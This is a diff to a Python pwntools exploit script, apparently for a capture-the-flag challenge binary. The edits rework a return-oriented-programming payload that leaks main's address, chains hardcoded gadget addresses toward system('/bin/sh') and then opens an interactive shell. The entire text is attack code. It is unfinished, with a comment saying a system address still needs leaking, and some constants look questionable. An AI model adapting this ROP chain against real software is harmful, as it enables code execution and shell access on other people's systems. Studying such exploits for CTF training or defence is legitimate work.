@@ -32,7 +32,7 @@ def genrop(addr):
     global ropnum
     global offset
     addr += offset
-    print hex(addr)
+    print "ropping to "+hex(addr)
     vals = [ord(i) for i in p64(addr)]
     retoffset = -104 + ropnum*8 # key - retptr = 104
     rop = ''
@@ -70,7 +70,8 @@ payload += 'd' * (0x59-0x53) # decrement
 payload += 'u' # overwrite
 
 r.sendline(payload)
-print payload
+#print payloaddd
+
 r.recvuntil('Verifying\n')
 
 mainaddr = u64(r.recvline()[:8]) - 1475
@@ -81,9 +82,12 @@ print 'main : ' + hex(mainaddr)
 
 payload = ''
 
-payload += genrop(0x0000555555555a3d) # ret
+payload += genrop(0x7ffff7e1c850) # need to leak system
 payload += genrop(0x00005555555559fb) # print 'flag'
-print payload
+payload += genrop(0x00007fffffffdd70) # pointer to /bin/sh
+payload += genrop(0x002f62696e2f7368) # /bin/sh
+
 r.sendline(payload)
+#print payload
 
 r.interactive()
